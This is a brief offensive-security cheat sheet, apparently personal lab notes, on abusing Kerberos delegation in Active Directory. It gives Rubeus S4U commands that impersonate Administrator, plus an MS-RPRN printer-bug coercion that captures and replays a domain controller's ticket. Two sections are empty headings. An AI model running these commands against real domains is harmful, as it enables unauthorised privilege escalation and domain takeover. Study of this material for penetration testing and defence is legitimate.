# Delegations

### Constrained Delegation

With the account with the permission's hash launch rubeus to ask a tgt as administrator

{% code overflow="wrap" %}
```powershell
./Rubeus.exe s4u /user:<USER> /aes256:<AES256 HASH> /impersonateuser:Administrator /msdsspn:"<FOUND SERVICE>" /ptt
```
{% endcode %}

### Unconstrained Delegation



### Resource Based Constrained Delegation



### Monitor for Delegation

idk if it's really a delegation&#x20;

Launch rubeus

```powershell
./Rubeus.exe monitor /targetuser:<TARGET MACHINE>$ /interval:5 /nowrap
```

&#x20;Now use MS-RPRN to force authentication from dcorp-dc$(Machine account)

```powershell
.\MS-RPRN.exe \\<TARGET MACHINE> \\<LISTENER MACHINE>
```

Rubeus is triggered

Copy the ticket and use it with rubeus on the local machine

```powershell
C:\AD\Tools\Rubeus.exe ptt /ticket:<TICKET>
```
